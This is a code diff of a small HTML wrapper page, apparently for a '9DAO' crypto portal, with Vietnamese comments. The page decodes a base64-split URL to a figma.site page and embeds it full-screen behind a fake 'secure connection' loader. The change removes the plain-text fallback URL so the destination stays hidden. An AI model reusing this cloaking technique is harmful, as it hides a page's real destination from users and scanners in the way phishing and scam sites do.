@@ -3,10 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>9DAO Portal</title>
+  <title>9DAO Secure Portal</title>
   <style>
-    body { margin: 0; padding: 0; overflow: hidden; }
-    iframe { width: 100%; height: 100vh; border: none; }
+    body { margin: 0; padding: 0; overflow: hidden; background: #000; }
     #loader { 
       position: fixed; 
       top: 0; left: 0; 
@@ -14,55 +13,49 @@
       display: flex; 
       justify-content: center; 
       align-items: center; 
-      background: #000; 
-      color: #0f0;
+      color: #0f0; 
       font-family: monospace;
+      z-index: 1000;
     }
   </style>
 </head>
 <body>
-  <div id="loader">Loading 9DAO interface...</div>
+  <div id="loader">Initializing secure connection...</div>
 
   <script>
-    // ✅ PHIÊN BẢN ĐƠN GIẢN - HOẠT ĐỘNG NGAY
+    // 🔒 PHIÊN BẢN CHỈ MÃ HÓA (ĐÃ TỐI ƯU)
     (function(){
-      // 1. URL đã được mã hóa thành các phần
-      const parts = [
-        "aHR0cHM6Ly9z", 
-        "aGVkLXdyYXA",
-        "tMTA4NzAwMjYu",
-        "ZmlnbWEuc2l0ZS8"
-      ];
+      // 1. URL được mã hóa thành 3 phần độc lập
+      const part1 = "aHR0cHM6Ly9z";
+      const part2 = "aGVkLXdyYXA";
+      const part3 = "tMTA4NzAwMjYuZmlnbWEuc2l0ZS8";
       
-      // 2. Hàm giải mã đơn giản
-      function loadContent() {
+      // 2. Hàm giải mã không có fallback
+      function decrypt() {
         try {
           // Ghép các phần và giải mã
-          const url = atob(parts.join(''));
+          const url = atob(part1 + part2 + part3);
+          
+          // Kiểm tra tính hợp lệ
+          if(!url.includes('figma.site')) return;
           
           // Tạo iframe
           const iframe = document.createElement('iframe');
           iframe.src = url;
+          iframe.style = 'width:100%;height:100vh;border:none';
           iframe.allowFullscreen = true;
           
-          // Thay thế loader
+          // Hiển thị
           document.body.innerHTML = '';
           document.body.appendChild(iframe);
           
         } catch(e) {
-          document.getElementById('loader').innerHTML = `
-            <div style="color:red;text-align:center">
-              <h3>LOADING COMPLETE</h3>
-              <p>Content is ready</p>
-            </div>`;
-          setTimeout(() => {
-            window.location.href = "https://shed-wrap-10870026.figma.site/";
-          }, 2000);
+          document.getElementById('loader').textContent = 'System error';
         }
       }
-      
-      // 3. Tự động chạy sau 1 giây
-      setTimeout(loadContent, 1000);
+
+      // 3. Tự động chạy
+      setTimeout(decrypt, 800);
     })();
   </script>
 </body>
